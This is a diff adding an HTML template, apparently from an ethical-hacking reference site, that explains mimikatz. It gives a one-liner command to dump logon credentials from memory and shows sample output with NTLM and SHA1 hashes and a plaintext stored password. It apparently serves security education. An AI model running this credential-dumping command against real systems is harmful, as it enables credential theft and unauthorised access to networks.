@@ -1,0 +1,55 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is <code>mimikatz.exe</code></h1>
+    <p class="common">Mimikatz is a tool that is commonly used by hackers and security professionals to extract sensitive information, such as passwords and credentials, from a system’s memory. It is typically used to gain unauthorized access to networks, systems, or applications or to perform other malicious activities, such as privilege escalation or lateral movement within a network.</p>
+
+    <h1>Usage</h1>
+    <h2 class="blue">OneLiner code</h2>
+    <div class="code-box"><pre><code>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</code></pre></div>
+
+
+    <h1>Output example</h1>
+    <h3><code>msv</code> : information about the credential ON THE MACHINE</h3>
+    <h3><code>credman</code> : credential information when the user logon to another host or service.</h3>
+
+    <div class="code-box"><pre><code>mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 673829 (00000000:000a4825)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : SECURE
+Logon Server      : SECURE
+Logon Time        : 2/20/2025 8:25:03 PM
+SID               : S-1-5-21-3197578891-1085383791-1901100223-500
+        <u>msv</u> :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : SECURE
+         * NTLM     : a51493b0b06e5e35f855245e71af1d14
+         * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : SECURE
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : SECURE
+         * Password : (null)
+        ssp :
+        <u>credman</u> :
+         [00000000]
+         * Username : apache
+         * Domain   : era.secura.local
+         * Password : New2Era4.!
+        cloudap :</code></pre></div>
+</body>
+</html>
